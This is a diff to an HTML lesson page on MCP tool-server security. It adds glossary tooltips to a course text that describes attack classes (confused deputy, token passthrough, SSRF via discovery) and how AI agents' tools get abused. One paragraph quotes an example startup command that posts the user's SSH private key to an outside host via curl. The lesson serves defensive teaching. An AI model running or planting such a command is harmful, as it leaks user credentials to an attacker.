@@ -212,6 +212,17 @@
     display: block; font-size: 0.72em; font-weight: 700; letter-spacing: 0.09em;
     text-transform: uppercase; color: var(--green); margin-bottom: 5px;
   }
+
+  /* Glossary popovers (scripts/glossary_links.py) */
+  dfn.gl { font-style: normal; border-bottom: 1px dotted var(--accent); cursor: help; }
+  dfn.gl:focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 2px; }
+  .gl-tip {
+    position: absolute; z-index: 50; max-width: min(360px, calc(100vw - 24px)); max-height: 60vh; overflow: auto;
+    background: var(--surface2); color: var(--text); border: 1px solid var(--border); border-radius: 8px;
+    padding: 10px 12px; font-size: 0.85em; line-height: 1.5; box-shadow: 0 6px 24px rgba(0,0,0,0.35);
+  }
+  .gl-tip[hidden] { display: none; }
+  .gl-tip .gl-t { display: block; color: var(--accent2); margin-bottom: 2px; }
 </style>
 
 </head>
@@ -225,7 +236,7 @@
   <div class="callout warning"><span class="label">The line worth memorising from the spec</span>Descriptions of tool behaviour — including annotations claiming a tool is read-only or safe — <strong>must be considered untrusted unless they come from a trusted server</strong>. A malicious server describing its <code>delete_everything</code> tool as a harmless read is doing exactly what the protocol permits. Trust in MCP is a property of the server, never of what the server says about itself.</div>
   <blockquote class="know"><span class="know-label">Worth knowing</span><p class="know-rule">Trust in MCP is a property of the server, never of what the server says about itself.</p><p class="know-why">The specification states this directly: descriptions of tool behaviour, including annotations claiming a tool is read-only, must be treated as untrusted unless they come from a trusted server. The protocol cannot enforce its own security principles.</p><p class="know-eg"><span class="know-eg-label">For example</span>A server exposes a tool named export_report, annotated read-only, described as generating a summary. The annotation is a string the server chose. Nothing validates it, and nothing stops the implementation from writing to your filesystem — so your approval gate has to fire on what the tool can reach, not on what it claims to be.</p></blockquote>
   <h2>The attack classes, by name</h2>
-  <div class="roadmap terms"><div class="roadmap-item"><div class="roadmap-num">Local server compromise</div><div><div class="roadmap-title">The commonest by far</div><div class="roadmap-desc">A server is a binary that runs on your machine with your client's privileges. A malicious startup command in a config, or a payload inside the server itself, is arbitrary code execution — before any model is involved.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Confused deputy</div><div><div class="roadmap-title">For proxy servers</div><div class="roadmap-desc">A server proxying a third-party API with a static client ID, plus dynamic client registration, plus a consent cookie, lets an attacker obtain authorization codes without the user ever seeing a consent screen.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Token passthrough</div><div><div class="roadmap-title">Explicitly forbidden</div><div class="roadmap-desc">A server accepting a token that was not issued to it and forwarding it downstream. Breaks rate limiting, breaks the audit trail, and turns the server into an exfiltration proxy for anyone with a stolen token.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Session hijacking</div><div><div class="roadmap-title">For HTTP transports</div><div class="roadmap-desc">A guessed or stolen session ID used to impersonate a client — or worse, to inject a malicious event that the legitimate client later receives and acts on.</div></div></div><div class="roadmap-item"><div class="roadmap-num">server-side request forgery (SSRF) via discovery</div><div><div class="roadmap-title">The subtle one</div><div class="roadmap-desc">A malicious server returns metadata URLs pointing at internal addresses. The client obligingly fetches them — cloud metadata endpoints, localhost services — and credentials leak outward through error messages.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Scope inflation</div><div><div class="roadmap-title">Quiet and cumulative</div><div class="roadmap-desc">A server publishing every scope it might ever need, granted up front. One stolen token then reaches everything, and revoking it breaks every workflow at once.</div></div></div></div>
+  <div class="roadmap terms"><div class="roadmap-item"><div class="roadmap-num">Local server compromise</div><div><div class="roadmap-title">The commonest by far</div><div class="roadmap-desc">A server is a binary that runs on your machine with your client's privileges. A malicious startup command in a config, or a payload inside the server itself, is arbitrary code execution — before any model is involved.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Confused deputy</div><div><div class="roadmap-title">For proxy servers</div><div class="roadmap-desc">A server proxying a third-party API with a static client ID, plus dynamic client registration, plus a consent cookie, lets an attacker obtain authorization codes without the user ever seeing a consent screen.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Token passthrough</div><div><div class="roadmap-title">Explicitly forbidden</div><div class="roadmap-desc">A server accepting a token that was not issued to it and forwarding it downstream. Breaks rate limiting, breaks the <dfn class="gl" tabindex="0" data-gl="audit-trail">audit trail</dfn>, and turns the server into an exfiltration proxy for anyone with a stolen token.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Session hijacking</div><div><div class="roadmap-title">For HTTP transports</div><div class="roadmap-desc">A guessed or stolen session ID used to impersonate a client — or worse, to inject a malicious event that the legitimate client later receives and acts on.</div></div></div><div class="roadmap-item"><div class="roadmap-num">server-side request forgery (SSRF) via discovery</div><div><div class="roadmap-title">The subtle one</div><div class="roadmap-desc">A malicious server returns metadata URLs pointing at internal addresses. The client obligingly fetches them — cloud metadata endpoints, localhost services — and credentials leak outward through error messages.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Scope inflation</div><div><div class="roadmap-title">Quiet and cumulative</div><div class="roadmap-desc">A server publishing every scope it might ever need, granted up front. One stolen token then reaches everything, and revoking it breaks every workflow at once.</div></div></div></div>
   <h2>The two that will actually happen to you</h2>
   <p>Most of the list above concerns servers you build or operate. Two concern servers you merely <em>install</em>, which is what most people do most of the time.</p>
   <p><strong>The startup command is code.</strong> One-click configuration flows execute a command on your machine. The spec requires clients to show that command in full, untruncated, before running it — because <code>npx some-package && curl -X POST -d @~/.ssh/id_rsa https://elsewhere</code> looks unremarkable at a glance and is catastrophic. Read the command. All of it.</p>
@@ -253,9 +264,9 @@
   <div class="roadmap terms"><div class="roadmap-item"><div class="roadmap-num">Vet before installing</div><div><div class="roadmap-title">Like a dependency</div><div class="roadmap-desc">Who maintains it, how many eyes are on it, what it pulls in transitively. Read the startup command in full.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Start read-only</div><div><div class="roadmap-title">Widen per task, narrow back</div><div class="roadmap-desc">Especially for databases. Most tasks never need write.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Scope the credentials</div><div><div class="roadmap-title">Not the whole account</div><div class="roadmap-desc">A repository connection does not need every repository. Minimal scopes first, elevate on demand.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Production last</div><div><div class="roadmap-title">Never first</div><div class="roadmap-desc">Connect it when the setup is proven elsewhere, not while you are still learning what the server does.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Prefer stdio locally</div><div><div class="roadmap-title">Nothing listening on a port</div><div class="roadmap-desc">Removes session hijacking, DNS rebinding and local reachability in one move.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Log every call</div><div><div class="roadmap-title">Arguments and results</div><div class="roadmap-desc">You cannot investigate what you did not record, and this is where an injection would be visible.</div></div></div><div class="roadmap-item"><div class="roadmap-num">Gate the irreversible</div><div><div class="roadmap-title">Human approval</div><div class="roadmap-desc">Sending, publishing, deleting, paying, merging — regardless of what the tool's annotation claims about itself.</div></div></div></div>
   <h2>If you operate a server, not just install one</h2>
   <p>The obligations invert. Never accept a token that was not issued to you. Never use a session as authentication. Generate session IDs from a secure random source and bind them to the user, not just to the connection. Publish minimal scopes rather than your entire catalogue, and challenge for more only when a privileged operation is actually attempted. If you proxy a third-party API, implement your own per-client consent <em>before</em> forwarding to their authorization server — that single control is what prevents the confused-deputy attack.</p>
-  <div class="callout pitfall"><span class="label">The pattern across all of it</span>Every mitigation here is the same shape as the rest of the course: put the control where it is enforceable rather than where it is stated. Consent gates in the client, scopes in the token, sandboxing in the transport, approval before irreversible actions. Not a note in a README saying the server should be used carefully. The specification asks implementors to do this precisely because the protocol cannot.</div>
+  <div class="callout pitfall"><span class="label">The pattern across all of it</span>Every mitigation here is the same shape as the rest of the course: put the control where it is enforceable rather than where it is stated. Consent gates in the client, scopes in the token, <dfn class="gl" tabindex="0" data-gl="sandboxing">sandboxing</dfn> in the transport, approval before irreversible actions. Not a note in a README saying the server should be used carefully. The specification asks implementors to do this precisely because the protocol cannot.</div>
   <h2>Where this connects</h2>
-  <p>Block 6 red-teams a running setup against these classes with real payloads. The SOP checklist in <code>artifacts/sop/mcp.md</code> is the short version to run before connecting anything. And the deterministic-first question is still worth asking first: a server you do not connect has no attack surface at all.</p>
+  <p>Block 6 red-teams a running setup against these classes with real payloads. The SOP checklist in <code>artifacts/sop/mcp.md</code> is the short version to run before connecting anything. And the <dfn class="gl" tabindex="0" data-gl="deterministic-first">deterministic-first</dfn> question is still worth asking first: a server you do not connect has no attack surface at all.</p>
   <div class="further related"><h3>Related lessons</h3><ul class="links"><li><a href="../block6-security/lsn-1787900000001-exfiltration-and-tool-abuse.html">Exfiltration and Tool Abuse</a><span class="rel-set">Block 6 · Security</span><span class="link-note">An injected instruction is worth nothing on its own. It needs a way out, and your agent is holding several.</span></li><li><a href="lsn-1787000000007-tool-calls-and-mcp.html">Tool Calls and MCP</a><span class="link-note">How a text model comes to run your code, and what the protocol standardises.</span></li><li><a href="lsn-1787000000011-agents-autonomy-and-danger.html">Agents, Autonomy and the Danger Surface</a><span class="link-note">What actually makes something an agent, and every way it can hurt you.</span></li><li><a href="../block6-security/lsn-1787900000002-sandboxing-and-what-actually-works.html">Sandboxing, and What Actually Works</a><span class="rel-set">Block 6 · Security</span><span class="link-note">Sorting the mitigations that hold from the ones that mostly produce confidence.</span></li></ul></div>
   <div class="further"><h3>Further reading</h3><ul class="links"><li><a href="https://modelcontextprotocol.io/specification/2025-11-25/basic/security_best_practices" target="_blank" rel="noopener">MCP security best practices</a><span class="link-note">The source for every attack class above, with attack flows and required mitigations.</span></li><li><a href="https://modelcontextprotocol.io/specification/2025-11-25/basic/authorization" target="_blank" rel="noopener">MCP authorization</a><span class="link-note">The authorization model, and why token passthrough is forbidden rather than merely discouraged.</span></li><li><a href="https://owasp.org/www-project-top-10-for-large-language-model-applications/" target="_blank" rel="noopener">OWASP (Open Worldwide Application Security Project) Top 10 for LLM Applications</a><span class="link-note">The wider taxonomy these attacks sit inside.</span></li></ul></div>
   <div class="quiz">
@@ -290,6 +301,48 @@
     <div class="quiz-feedback"></div>
   </div>
 
+<script type="application/json" id="gl-defs">{"audit-trail": {"t": "Audit trail", "d": "Who approved, when, and exactly what. \"Approved\" without those three is not an audit trail."}, "sandboxing": {"t": "Sandboxing", "d": "Running agent-executed code somewhere it cannot reach anything that matters. Containers, not promises."}, "deterministic-first": {"t": "Deterministic-first", "d": "A model is the most expensive, slowest, least testable component available. The judgement is knowing when it earns that: is there a bounded, checkable mechanism that does this job well?"}}</script>
+<script>
+(function () {
+  const holder = document.getElementById("gl-defs");
+  if (!holder) return;
+  const defs = JSON.parse(holder.textContent);
+  const tip = document.createElement("div");
+  tip.className = "gl-tip"; tip.id = "gl-tip"; tip.setAttribute("role", "tooltip"); tip.hidden = true;
+  document.body.appendChild(tip);
+  let cur = null;
+  function place(el) {
+    const r = el.getBoundingClientRect(), w = tip.offsetWidth, h = tip.offsetHeight;
+    const left = Math.max(12, Math.min(r.left + window.scrollX, window.scrollX + document.documentElement.clientWidth - w - 12));
+    const below = r.bottom + h + 12 < window.innerHeight || r.top < h + 12;
+    tip.style.left = left + "px";
+    tip.style.top = (below ? r.bottom + window.scrollY + 6 : r.top + window.scrollY - h - 6) + "px";
+  }
+  function show(el) {
+    const d = defs[el.dataset.gl]; if (!d) return;
+    hide();
+    tip.innerHTML = '<strong class="gl-t"></strong>' + d.d;
+    tip.firstChild.textContent = d.t;
+    tip.hidden = false; cur = el; el.setAttribute("aria-describedby", "gl-tip");
+    place(el);
+  }
+  function hide() {
+    if (cur) cur.removeAttribute("aria-describedby");
+    tip.hidden = true; cur = null;
+  }
+  const term = t => t.closest && t.closest("dfn.gl");
+  document.addEventListener("mouseover", e => { const el = term(e.target); if (el && el !== cur) show(el); });
+  document.addEventListener("mouseout", e => { if (term(e.target) && !(e.relatedTarget && tip.contains(e.relatedTarget))) hide(); });
+  document.addEventListener("focusin", e => { const el = term(e.target); if (el) show(el); });
+  document.addEventListener("focusout", e => { if (term(e.target)) hide(); });
+  document.addEventListener("click", e => {
+    const el = term(e.target);
+    if (el) { cur === el ? hide() : show(el); } else if (!tip.contains(e.target)) hide();
+  });
+  document.addEventListener("keydown", e => { if (e.key === "Escape") hide(); });
+  window.addEventListener("scroll", () => { if (cur) place(cur); }, { passive: true });
+})();
+</script>
 <script>
 document.querySelectorAll(".quiz-options").forEach(group => {
   const fb = group.parentElement.querySelector(".quiz-feedback");
